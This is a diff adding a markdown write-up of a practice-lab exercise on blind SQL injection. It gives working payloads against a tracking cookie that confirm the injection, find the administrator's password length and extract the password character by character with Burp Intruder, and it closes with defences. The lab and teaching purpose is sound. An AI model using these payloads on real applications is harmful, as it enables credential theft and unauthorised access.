@@ -1,1 +1,120 @@
+# Blind SQL Injection with Conditional Responses
 
+Detailed walkthrough of extracting an administrator's password through **blind SQL injection**, where the application shows no query output but responds differently to true and false conditions.
+
+> ⚠️ **Authorized testing only.** Performed against an intentionally vulnerable practice lab. Never test systems without explicit written permission.
+
+---
+
+## The scenario
+
+The application uses a `TrackingId` cookie in a SQL query but shows no results from it directly. It does, however, display a **"Welcome back"** message only when the query behaves normally. That single difference is enough to extract data one true/false answer at a time.
+
+---
+
+## Step 1: Confirm the injection point
+
+Send two versions of the cookie and compare the responses:
+
+```
+TrackingId=xyz' AND '1'='1      → "Welcome back" appears   (TRUE condition)
+TrackingId=xyz' AND '1'='2      → message is absent        (FALSE condition)
+```
+
+Because a true condition and a false condition produce visibly different pages, we can ask the database yes/no questions and read the answer from the response.
+
+---
+
+## Step 2: Confirm the table and user exist
+
+```
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+A TRUE response (the "Welcome back" message) confirms a `users` table exists.
+
+```
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+A TRUE response confirms there is an `administrator` user.
+
+---
+
+## Step 3: Find the password length
+
+Test the length with a greater-than comparison, increasing the number until the condition turns FALSE:
+
+```
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
+
+Doing this by hand is slow, so automate it in **Burp Intruder**:
+
+| Setting | Value |
+|---|---|
+| Attack type | Sniper |
+| Payload type | Numbers |
+| Range | 1 to 25, step 1 |
+| Payload position | around the length value |
+
+```
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
+```
+
+The number where the response flips from TRUE to FALSE is the password length. (For example, if `>19` is TRUE but `>20` is FALSE, the password is 20 characters.)
+
+---
+
+## Step 4: Extract the password character by character
+
+`SUBSTRING()` returns one character of the password so it can be tested against each possible value:
+
+```
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+```
+
+- `SUBSTRING(password,1,1)` = the **1st** character
+- `SUBSTRING(password,2,1)` = the **2nd** character, and so on
+
+### Automating with Burp Intruder (Cluster Bomb)
+
+To test every position against every character in one run:
+
+| Payload position | Values |
+|---|---|
+| **1 — character position** | numbers `1` to *(password length)* |
+| **2 — character guess** | `a`–`z`, `0`–`9` |
+
+```
+' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
+```
+
+A **Cluster Bomb** attack tries each position with each character. The requests that return TRUE reveal the correct character at each position. Read them in order and you have the full password.
+
+---
+
+## Step 5: Log in
+
+Use the recovered `administrator` password to log in and complete the lab.
+
+---
+
+## Notes & gotchas
+
+- **Straight quotes only.** These payloads use `'`. If pasted as curly quotes (`'`), they will fail.
+- **Watch the response, not the data.** In blind SQLi you never see the value directly, only whether the condition was true or false.
+- **Sort Intruder results by response length or status** to spot the TRUE responses quickly.
+- **DBMS differences:** `SUBSTRING()` is used by MySQL and SQL Server; Oracle and PostgreSQL use `SUBSTR()`.
+
+---
+
+## Why this matters (defence)
+
+Blind SQLi is slower for an attacker but just as damaging, and error suppression alone doesn't stop it. The real fix is the same as for any SQLi:
+
+- **Parameterised queries / prepared statements** so input is never treated as SQL
+- **Least-privilege database accounts** to limit what a successful injection can reach
+- **Consistent responses** that don't reveal true/false state to the user
+
+---
+
+*Part of my [SQL Injection lab write-up](../README.md).*
